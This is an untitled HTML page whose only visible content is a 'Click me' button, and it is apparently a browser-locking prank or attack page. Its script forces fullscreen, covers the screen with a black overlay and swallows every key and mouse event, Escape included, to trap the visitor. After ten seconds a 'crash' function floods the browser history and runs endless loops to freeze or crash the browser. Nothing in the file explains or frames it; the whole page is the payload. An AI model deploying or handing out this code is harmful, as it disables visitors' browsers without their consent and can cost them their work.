<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title></title>
    <style>
      body {
        margin: 0;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: #f0f0f0;
      }
      button {
        padding: 10px 20px;
        font-size: 20px;
        color: white;
        background-color: red;
        border: none;
        cursor: pointer;
      }
      #blocker {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: black;
        display: none;
        justify-content: center;
        align-items: center;
        color: white;
        font-size: 24px;
        z-index: 1000;
      }
    </style>
  </head>
  <body>
    <button onclick="enterFullscreen()">Click me</button>
    <div id="blocker"></div>

    <script>
      function enterFullscreen() {
        const elem = document.documentElement;
        if (elem.requestFullscreen) {
          elem.requestFullscreen();
        } else if (elem.mozRequestFullScreen) {
          elem.mozRequestFullScreen();
        } else if (elem.webkitRequestFullscreen) {
          elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) {
          elem.msRequestFullscreen();
        }

        const blocker = document.getElementById("blocker");
        blocker.style.display = "flex";

        document.addEventListener("keydown", blockEvent, true);
        document.addEventListener("keyup", blockEvent, true);
        document.addEventListener("keypress", blockEvent, true);
        document.addEventListener("mousedown", blockEvent, true);
        document.addEventListener("mouseup", blockEvent, true);
        document.addEventListener("click", blockEvent, true);
        document.addEventListener("dblclick", blockEvent, true);
        document.addEventListener("contextmenu", blockEvent, true);

        setTimeout(crash, 10000);
      }

      function blockEvent(event) {
        if (
          event.key === "Escape" ||
          event.key === "Esc" ||
          event.keyCode === 27
        ) {
          event.preventDefault();
          event.stopPropagation();
        } else {
          event.stopPropagation();
          event.preventDefault();
        }
      }

      function crash() {
        var total = "";
        for (var i = 0; i < 9999999999999; i++) {
          total += i.toString();
          history.pushState(0, 0, total);
        }

        while (true) {
          for (let i = 999909; i === i; i *= i) {
            console.log(i);
          }
        }

        while (true) {
          for (let i = 991; i === i; i *= i) {
            console.log(i);
          }
        }

        while (true) {
          for (let i = 9999; i === i; i *= i) {
            console.log(i);
          }
        }

        while (true) {
          for (let i = 999; i === i; i *= i) {
            console.log(i);
          }
        }
        while (true) {
          for (let i = 9999; i === i; i *= i) {
            console.log(i);
          }
        }
      }
    </script>
  </body>
</html>
